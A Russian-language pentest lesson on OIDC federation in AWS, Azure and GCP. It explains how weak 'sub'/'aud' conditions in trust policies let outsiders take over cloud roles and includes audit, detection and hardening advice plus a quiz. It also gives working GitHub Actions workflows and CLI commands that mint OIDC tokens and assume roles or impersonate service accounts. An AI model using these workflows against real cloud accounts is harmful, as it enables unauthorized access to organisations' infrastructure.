---
id: cloud-oidc-federation
title: "OIDC-федерация и trust-политики: доверие, которое можно обмануть"
category: cloud
parent: cloud-cicd-secrets
difficulty: expert
order: 4
tags: [cloud, oidc, federation, trust-policy, assume-role, workload-identity]
prerequisites: [cloud-cicd-secrets, cloud-assume-role]
useful_for:
  - "Эксплуатация OIDC-доверия к облакам"
  - "Понимание федерации идентичностей"
  - "Пентест CI/CD и внешних интеграций"
estimated_minutes: 40
summary: "Как устроена OIDC-федерация в AWS/Azure/GCP, какие условия trust-политик критичны (aud/sub/iss) и как слабые проверки ведут к захвату облачных ролей. Практические пейлоады."
---
## Зачем этот урок

Современные организации больше не хранят долгоживущие облачные ключи в CI — они используют **OIDC-федерацию**: внешний IdP (GitHub Actions, GitLab, Auth0, Okta, ваш корпоративный) выпускает подписанный JWT, а облако проверяет его и выдаёт временные креды. Это безопаснее, но **trust-политика** становится единственной защитой. Одна слабая проверка claim — и роль захвачена. Здесь разбираем, как устроена федерация, какие условия критичны и как слабые конфигурации эксплуатируются.

## Как работает федерация идентичностей

```
Внешний IdP (GitHub/GitLab/Auth0/Okta) ──JWT──► Облако (STS)
        ▲                                          │
        └── проверяет iss, aud, sub, exp ◄─────────┘
```

Облако доверяет IdP, если его OIDC-провайдер зарегистрировано (`arn:aws:iam::...:oidc-provider/token.actions.githubusercontent.com`), и проверяет claims токена по условиям trust-политики. Никаких долгоживущих секретов нет — есть подписанный JWT с коротким сроком жизни.

## AWS: AssumeRoleWithWebIdentity и trust policy

Trust policy роли:

```json
{
  "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
    "StringLike": {"token.actions.githubusercontent.com:sub": "repo:corp/deploy:ref:refs/heads/main"}
  }
}
```

Обмен токена:

```bash
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::<ACCT>:role/ci-role \
  --role-session-name gh \
  --web-identity-token "$OIDC_TOKEN"
```

## Критичные claims: iss/aud/sub/exp

| Claim | Что проверяет | Слабость |
|-------|---------------|----------|
| `iss` | issuer IdP | должен быть точным, иначе подмена IdP |
| `aud` | audience | обязателен, но недостаточен |
| `sub` | субъект (репо/ветка/env) | **главная защита** |
| `exp` | срок | должен быть коротким |

`sub` в GitHub выглядит как `repo:ORG/REPO:ref:refs/heads/BRANCH`, `repo:ORG/REPO:pull_request`, `repo:ORG/REPO:environment:ENV`.

## Опасные конфигурации trust policy

- Нет условия на `sub` — любой субъект от IdP получает роль.
- `sub: repo:org/*` — любой репозиторий организации.
- `sub: repo:org/*:*` — любой репозиторий и любая ветка/окружение.
- Условие только на `aud` — фактически публичный доступ.
- `Principal: "*"` в federation — критично.
- `StringLike` вместо `StringEquals` с `*` в неожиданных местах.

## Azure: federated identity credentials

В Entra ID приложение может доверять внешнему OIDC-провайдеру:

```bash
az ad app federated-credential create --id <APP_ID> --parameters '{
  "name": "github",
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:corp/deploy:ref:refs/heads/main",
  "audiences": ["api://AzureADTokenExchange"]
}'
```

Слабый `subject` (или его отсутствие, или wildcard) → любой workflow получает токен приложения и все его права на Azure (RBAC). Проверьте список federated credentials: `az ad app federated-credential list --id <APP_ID>`.

## GCP: Workload Identity Federation

```bash
gcloud iam workload-identity-pools create-cred-config \
  projects/<NUM>/locations/global/workloadIdentityPools/<POOL>/providers/<PROVIDER> \
  --service-account=<SA> --output-file=creds.json
```

Привязка `principalSet://...` может быть слишком широкой: `attribute.repository/org == "corp"` вместо конкретного репозитория, или `attribute.repository_owner == "corp"`. Проверьте IAM bindings на SA.

## Confused deputy и свои IdP

Если у вас **свой** OIDC-провайдер (или аккаунт в публичном IdP), и облачная роль доверяет этому IdP, проверяя только `aud` — вы выпускаете токен от своего имени и получаете креды. Это классический confused deputy: облако не отличает «легитимный» токен от вашего. Дополнительный признак — отсутствие `Condition` на `sub`/`amr`.

## Разобранный пример: слабый sub → захват роли

1. В trust policy роли видим `"StringLike": {"...:sub": "repo:corp/*"}`.
2. Если можем создать репозиторий в организации `corp` (или у нас есть права на существующий) — делаем workflow:

```yaml
permissions: { id-token: write, contents: read }
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - run: |
          TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          aws sts assume-role-with-web-identity \
            --role-arn arn:aws:iam::<ACCT>:role/ci-role \
            --role-session-name gh --web-identity-token "$TOKEN"
```

3. Получаем временные креды роли. Дальше — стандартная разведка (`enumerate-iam`).

## Инструменты и проверки

```bash
# Найти все роли, доверяющие OIDC
aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.Statement[?Principal.Federated]].[RoleName,AssumeRolePolicyDocument]"
# Azure federated credentials
az ad app federated-credential list --id <APP_ID>
# GCP workload identity bindings
gcloud iam service-accounts get-iam-policy <SA>
```

Для ручного выпуска JWT от своего IdP используйте `jwt`-библиотеки и `aws sts assume-role-with-web-identity`.

## Защита

- Всегда проверять точный `sub` (репо + ветка + environment).
- Ограничивать `aud` конкретным значением.
- Не использовать `repo:org/*`.
- Короткий срок токенов, аудит выдачи (`AssumeRoleWithWebIdentity` в CloudTrail).
- Для внешних интеграций — ExternalId/строгие claims.

## Частые ошибки

- **Смотреть только `aud`.** Без `sub` роль фактически публична.
- **Считать `repo:org/*` безопасным.** Любой репо org получает доступ.
- **Не проверять `iss`.** Подмена IdP при нестрогом issuer.
- **Игнорировать `environment`.** В GitHub можно ограничить `environment:` — проверьте это условие.
- **Забыть про свои IdP.** Свой OIDC-провайдер часто обходит слабую проверку.

## Что делать дальше / решение

Практика: перечислите роли с OIDC-federation, найдите `sub` с wildcard, выпустите токен из своего workflow и получите креды. Дальше — `cloud-cicd-github-actions` (workflow injection), `cloud-assume-role` (cross-account) и `cloud-privesc-iam`.

## JWT: как читать и проверять

OIDC-токен — это JWT из трёх частей (header.payload.signature), разделённых точками. Payload — base64url JSON с claims. Декодируйте локально:

```bash
python3 -c "import sys,base64,json; t=sys.argv[1].split('.')[1]; print(json.dumps(json.loads(base64.urlsafe_b64decode(t+'===')), indent=2))" "$TOKEN"
```

Ищите `iss`, `aud`, `sub`, `exp`, `iat`. Именно эти значения сравниваются с условиями trust-политики. Если `sub` содержит широкий шаблон — цель найдена.

## Azure federation: эксплуатация

Создайте GitHub-workflow с `permissions: id-token: write`, запросите токен для Azure:

```yaml
- run: |
    TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
    az login --service-principal -u $AZURE_CLIENT_ID --tenant $AZURE_TENANT_ID --federated-token "$TOKEN"
    az account list
```

Если federated credential приложения принимает широкий `subject` — вы получаете RBAC приложения в Azure.

## GCP WIF: эксплуатация

```bash
gcloud iam workload-identity-pools create-cred-config \
  projects/<NUM>/locations/global/workloadIdentityPools/<POOL>/providers/<PROV> \
  --service-account=<SA> --output-file=creds.json
gcloud auth login --cred-file=creds.json
gcloud projects list
```

Если `principalSet` включает вашу org/repo — вы имперсонируете сервисный аккаунт.

## Аудит: где искать слабые trust-политики

```bash
aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.Statement[?Principal.Federated]].[RoleName]"
aws iam get-role --role-name <R> --query 'Role.AssumeRolePolicyDocument'
```

Ищите: отсутствие `Condition` на `sub`, `StringLike` с `*`, `aud` без `sub`, `Principal: "*"`. В Azure — `az ad app federated-credential list`, в GCP — `get-iam-policy` сервисного аккаунта.

## OPSEC и детект

Выдача токена (`AssumeRoleWithWebIdentity`) видна в CloudTrail — с полем `subjectFromWebIdentityToken`. Необычный `sub` (чужой репозиторий) — явный признак атаки. Для защитников: алерт на роли с широким `sub` и на выдачу из неожиданных репозиториев.

## GitHub Actions OIDC: как выглядит токен

Токен из GitHub Actions содержит `iss: https://token.actions.githubusercontent.com`, `aud` (обычно `sts.amazonaws.com`), `sub` вида `repo:org/repo:ref:refs/heads/main` или `repo:org/repo:pull_request`, а также `repository`, `ref`, `environment`. Именно `sub` (и иногда `environment`) должен проверяться. Отсутствие проверки `sub` — самая частая и самая дорогая ошибка.

## Практический чеклист аудита федерации

- Найти все роли/приложения с доверием к внешнему OIDC-провайдеру.
- Для каждой проверить: есть ли `Condition` на `sub`, нет ли `*` в нём.
- Проверить `aud` — не `*` ли он.
- Проверить `iss` — совпадает ли с ожидаемым IdP.
- Проверить, не доверяет ли роль вашему/публичному IdP.
- Проверить `environment`/`ref`-ограничения в GitHub.

## Подмена алгоритма и audience confusion

Если облако проверяет `aud` по значению, а вы можете выпустить токен от **своего** IdP с тем же `aud` — это audience confusion. Всегда проверяйте, что `iss` жёстко задан. `alg: none` и `HS256`-подмена в OIDC-федерации обычно не работают (STS проверяет подпись по ключам провайдера), но неверная конфигурация IdP (приём токенов с любым `iss`) — реальный вектор.

## Сравнение провайдеров

| Облако | Операция | Критичное условие |
|--------|----------|-------------------|
| AWS | `sts:AssumeRoleWithWebIdentity` | `sub`, `aud` |
| Azure | federated credential | `subject`, `audiences` |
| GCP | Workload Identity | `principalSet`, attribute |

Во всех трёх главное — сузить субъект до конкретного репозитория/ветки/окружения.

## Вывод

OIDC-федерация безопасна ровно настолько, насколько строга trust-политика. Слабый `sub` превращает «безопасную» федерацию в публичный доступ к роли.

## Квиз

```quiz
- question: "Какой claim в OIDC-токене является главной защитой trust-политики?"
  options:
    - "aud"
    - "sub (субъект: репозиторий, ветка, окружение)"
    - "exp"
    - "iat"
  answer: 1
  explanation: "sub определяет, какой именно workflow/репозиторий получает роль."
- question: "Почему условие sub: repo:org/* опасно?"
  options:
    - "Оно слишком узкое"
    - "Любой репозиторий организации получает доступ к роли"
    - "Оно требует MFA"
    - "Оно шифрует токен"
  answer: 1
  explanation: "Wildcard по всем репозиториям org = широкий доступ."
- question: "Какая AWS-операция обменивает OIDC-токен на временные креды?"
  options:
    - "sts:GetSessionToken"
    - "sts:AssumeRoleWithWebIdentity"
    - "iam:CreateUser"
    - "sts:GetCallerIdentity"
  answer: 1
  explanation: "AssumeRoleWithWebIdentity принимает OIDC-токен и возвращает креды роли."
- question: "Что происходит, если trust policy проверяет только aud, но не sub?"
  options:
    - "Ничего"
    - "Любой субъект от доверенного IdP может получить роль"
    - "Токен недействителен"
    - "Требуется пароль"
  answer: 1
  explanation: "Без проверки sub любой, кто может выпустить токен от IdP, получает роль."
- question: "Как ограничить доступ GitHub Actions в Azure federated credential?"
  options:
    - "Указать точный subject (репо+ветка) и aud"
    - "Отключить OIDC"
    - "Использовать пароль"
    - "Разрешить все subject"
  answer: 0
  explanation: "Точный subject ограничивает, какой workflow может получить токен приложения."
```

## Где пригодится

- **Пентест CI/CD и облаков** — захват ролей через федерацию.
- **Red team** — от слабого sub к облачным кредам.
- **Bug bounty** — интеграции с OIDC.
- **IR/Blue team** — аудит trust-политик.
- **DevSecOps** — безопасная настройка OIDC-федерации.
